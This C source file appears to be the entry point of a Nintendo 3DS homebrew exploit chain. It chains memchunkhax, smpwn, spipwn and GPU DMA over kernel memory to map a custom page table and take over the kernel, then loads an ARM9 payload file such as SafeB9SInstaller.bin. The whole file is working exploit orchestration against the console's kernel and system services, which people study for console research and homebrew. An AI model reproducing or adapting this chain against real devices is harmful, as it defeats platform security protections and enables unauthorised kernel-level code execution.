#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <malloc.h>
#include "lib/srv.h"
#include "lib/gsp.h"

#include "memchunkhax.h"
#include "smpwn.h"
#include "spipwn.h"
#include "kernel_gspwn.h"

#ifndef DEFAULT_PAYLOAD_FILE_OFFSET
#define DEFAULT_PAYLOAD_FILE_OFFSET 0
#endif
#ifndef DEFAULT_PAYLOAD_FILE_NAME
#define DEFAULT_PAYLOAD_FILE_NAME   "SafeB9SInstaller.bin"
#endif

typedef union ExploitChainLayout {
    u8 workBuffer[0x10000];
    BlobLayout blobLayout;
} ExploitChainLayout;

static_assert(sizeof(ExploitChainLayout) == 0x10000, "Wrong ExploitChainLayout size");

static void prepareBlobLayout(BlobLayout *layout, Handle gspHandle, const u8 *khc3dsBin, size_t khc3dsBinSize)
{
    memset(layout->l2table, 0, 0x400);
    memcpy(layout->code, khc3dsBin, khc3dsBinSize);
    khc3dsPrepareL2Table(layout);

    // Ensure everything (esp. the layout) is written back into the main memory
    gspDoFullCleanInvCacheTrick(gspHandle);
}

static void ensurePageTableCoherency(Handle gspHandle)
{
    // https://developer.arm.com/docs/ddi0360/e/memory-management-unit/hardware-page-table-translation
    // "MPCore hardware page table walks do not cause a read from the level one Unified/Data Cache"
    __dsb();
    __flush_prefetch_buffer();
    gspDoFullCleanInvCacheTrick(gspHandle);
}

static Result doExploitChain(
    ExploitChainLayout *layout, Handle gspHandle,
    const char *payloadFileName, size_t payloadFileOffset,
    const u8 *khc3dsBin, size_t khc3dsBinSize
)
{
    Result res = 0;

    u8 kernelVersionMinor = KERNEL_VERSION_MINOR;
    if (kernelVersionMinor < 48) {
        // Below 9.3 -- memchunkhax

        // Fill top screen gray
        gspSetLcdFill(gspHandle, true, 128, 128, 128);

        TRY(memchunkhax(layout->workBuffer, gspHandle));

        prepareBlobLayout(&layout->blobLayout, gspHandle, khc3dsBin, khc3dsBinSize);
        mapL2TableViaSvc0x7b(&layout->blobLayout);
        ensurePageTableCoherency(gspHandle);
    }

#ifndef MEMCHUNKHAX_ONLY // reduces the size by around 3KB
    else {
        // 9.3 and above: use smpwn (7.x+) and LazyPixie or spipwn (>= 11.12), as I've only bothered to
        // put 8.x+ constants, older versions aren't exploitable that way;
        // then GPU DMA over the kernel memory, in the case of spipwn.

        // Exploit sm
        SmpwnContext *ctx = (SmpwnContext *)layout->blobLayout.smallWorkBuffer;
        Handle srvHandle;

        // Fill top screen white
        gspSetLcdFill(gspHandle, true, 255, 255, 255);

        prepareBlobLayout(&layout->blobLayout, gspHandle, khc3dsBin, khc3dsBinSize);

        TRY_ALL(smpwn(&srvHandle, ctx));
        //TRY(smPartiallyCleanupSmpwn(ctx));

        // Fill top screen blue-ish.
        gspSetLcdFill(gspHandle, true, 128, 128, 200);

        if (false) { //(kernelVersionMinor < 56) { // (unstable, disabled)
            // Do LazyPixie. This is unreliable. NOTE: this code path doesn't handle being run from core2 or core3.
            // KHC L2 table is only mapped for core0 at first, then we GPU DMA over kernel memory.
            TRY(smMapL2TableViaLazyPixie(ctx, &layout->blobLayout));
            ensurePageTableCoherency(gspHandle);

            // Set CFG11_GPUPROT = 0
            *(vu32 *)(KHC3DS_MAP_ADDR + 0xA2000 + 0x140) = 0;
            __dsb();
        } else {
            TRY(smRemoveRestrictions(ctx));

            // We now have access to all services, and can spawn new sessions of srv:pm
            // Exploit spi with that.
            TRY(spipwn(srvHandle));
        }

        // We can now GPU DMA the kernel. Let's map the L2 table we have prepared
        mapL2TableViaGpuDma(&layout->blobLayout, layout->blobLayout.smallWorkBuffer, gspHandle);

        svcCloseHandle(srvHandle);
    }
#endif

    khc3dsLcdDebug(true, 128, 64, 0); // brown
    return khc3dsTakeover(payloadFileName, payloadFileOffset);
}

Result otherappMain(u32 paramBlkAddr, const u8 *khc3dsBin, size_t khc3dsBinSize)
{
    Result res = 0;

    const char *arm9PayloadFileName;
    size_t arm9PayloadFileOffset;

    // Standard otherapp stuff:
    Handle gspHandle = **(Handle **)(paramBlkAddr + 0x58);

    // Custom stuff:
    u32 arm9ParamMagic = *(u32 *)(paramBlkAddr + 0xEF8);
    if (arm9ParamMagic == 0xC0DE0009) {
        arm9PayloadFileOffset = *(size_t *)(paramBlkAddr + 0xEFC);
        arm9PayloadFileName = (const char *)(paramBlkAddr + 0xF00); // max 255 characters
    } else {
        arm9PayloadFileOffset = DEFAULT_PAYLOAD_FILE_OFFSET;
        arm9PayloadFileName = DEFAULT_PAYLOAD_FILE_NAME;
    }
    ExploitChainLayout *layout = (ExploitChainLayout *)((paramBlkAddr + 0x1000) & ~0xFFF);

    // Set top priority for our thread
    TRY(svcSetThreadPriority(CUR_THREAD_HANDLE, 0x18));

    res = doExploitChain(layout, gspHandle, arm9PayloadFileName, arm9PayloadFileOffset, khc3dsBin, khc3dsBinSize);
    if (res != 0) {
        gspSetLcdFill(gspHandle, false, 255, 0, 0);
    }
    return res;
}
